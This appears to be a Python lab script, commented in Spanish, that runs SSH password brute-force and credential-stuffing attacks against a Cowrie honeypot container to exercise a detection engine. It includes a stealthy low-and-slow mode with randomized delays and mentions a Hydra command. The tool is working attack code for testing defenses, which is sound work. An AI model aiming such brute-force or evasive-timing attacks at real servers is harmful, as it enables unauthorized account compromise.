#!/usr/bin/env python3
"""Atacante de laboratorio contra el honeypot Cowrie (banco de pruebas, objetivo 9).

SOLO para usar contra el contenedor Cowrie de este proyecto, dentro de la red Docker
interna. Cada contenedor atacante tiene su propia IP, así el motor ASI ve varios orígenes.

    attack.py banner                    # Escenario 1: conexión y banner, sin login
    attack.py manual                    # 3 intentos manuales en unos segundos
    attack.py rafaga                    # ráfaga breve (60 intentos, ~6/s)
    attack.py stuffing                  # Escenario 3: 1500 intentos, ~8/s
    attack.py persistente               # 300 intentos, ~2/s (varios minutos)
    attack.py sigilosa                  # Escenario 2 (low and slow): 1 intento cada 20-40 s (≈1 hora); alias: lenta
Para Hydra ver el README (hydra -L ... -P ... -s 2222 ssh://cowrie).
"""
from __future__ import annotations

import argparse
import itertools
import json
import math
import random
import socket
import sys
import threading
import time

import paramiko

from wordlist import pairs

PRESETS = {
    "rafaga":      dict(count=60, rate=6.0),
    "stuffing":    dict(count=1500, rate=8.0),
    "persistente": dict(count=300, rate=2.0),
    "manual":      dict(count=3, rate=0.5),
}


def intento(host: str, port: int, user: str, pw: str, timeout: float = 8.0):
    """True = entró, False = rechazado, None = error de red."""
    sock = transport = None
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        transport = paramiko.Transport(sock)
        transport.banner_timeout = timeout
        transport.start_client(timeout=timeout)
        transport.auth_password(user, pw)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return None
    finally:
        for c in (transport, sock):
            try:
                if c:
                    c.close()
            except Exception:
                pass


def banner(host: str, port: int) -> None:
    with socket.create_connection((host, port), timeout=8) as s:
        s.settimeout(5)
        try:
            print("banner:", s.recv(256).decode(errors="replace").strip())
        except socket.timeout:
            print("sin banner")


def con_tasa(host, port, creds, rate, workers, progress=False):
    it = iter(creds)
    total = len(creds)
    lock = threading.Lock()
    siguiente = [time.monotonic()]
    cont = {"ok": 0, "fail": 0, "err": 0}

    def trabajador():
        while True:
            with lock:
                try:
                    u, p = next(it)
                except StopIteration:
                    return
                ahora = time.monotonic()
                espera = max(0.0, siguiente[0] - ahora)
                siguiente[0] = max(ahora, siguiente[0]) + 1.0 / rate
            if espera:
                time.sleep(espera)
            r = intento(host, port, u, p)
            with lock:
                cont["err" if r is None else "ok" if r else "fail"] += 1

    def informar():
        # Machine-readable progress line, consumed by the lab runner (--progress only).
        print("PROGRESS " + json.dumps({"total": total, **cont}), flush=True)

    hilos = [threading.Thread(target=trabajador) for _ in range(workers)]
    [h.start() for h in hilos]
    while progress and any(h.is_alive() for h in hilos):
        informar()
        time.sleep(1.0)
    [h.join() for h in hilos]
    if progress:
        informar()
    return cont


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawTextHelpFormatter)
    ap.add_argument("escenario", choices=["banner", "manual", "rafaga", "stuffing", "persistente", "sigilosa", "lenta"])
    ap.add_argument("--host", default="cowrie")
    ap.add_argument("--port", type=int, default=2222)
    ap.add_argument("--count", type=int)
    ap.add_argument("--rate", type=float, help="intentos por segundo")
    ap.add_argument("--usuario", help="un solo usuario (por defecto se rota una lista)")
    ap.add_argument("--seed", type=int)
    ap.add_argument("--progress", action="store_true", help="emitir líneas PROGRESS {json} (uso interno)")
    a = ap.parse_args()
    rng = random.Random(a.seed)
    usuarios = [a.usuario] if a.usuario else None

    if a.escenario == "banner":
        banner(a.host, a.port)
        return 0

    if a.escenario in ("sigilosa", "lenta"):
        n = a.count or 120
        creds = pairs(n, rng, usuarios or ["root"])
        print(f"fuerza bruta sigilosa (low and slow): {n} intentos, 20-40 s entre cada uno (≈{n * 30 / 60:.0f} min)")
        cont = {"ok": 0, "fail": 0, "err": 0}
        for i, (u, p) in enumerate(creds, 1):
            r = intento(a.host, a.port, u, p)
            cont["err" if r is None else "ok" if r else "fail"] += 1
            if a.progress:
                print("PROGRESS " + json.dumps({"total": n, **cont}), flush=True)
            if i % 10 == 0:
                print(f"  {i}/{n} {cont}", flush=True)
            time.sleep(rng.uniform(20, 40))
        print("resultado:", cont)
        return 0

    p = PRESETS[a.escenario]
    n, rate = a.count or p["count"], a.rate or p["rate"]
    print(f"{a.escenario}: {n} intentos a {rate}/s contra {a.host}:{a.port}")
    t0 = time.monotonic()
    cont = con_tasa(a.host, a.port, pairs(n, rng, usuarios), rate, max(1, math.ceil(rate * 0.4)),
                   progress=a.progress)
    print(f"resultado: {cont} en {time.monotonic() - t0:.1f} s")
    return 0


if __name__ == "__main__":
    sys.exit(main())
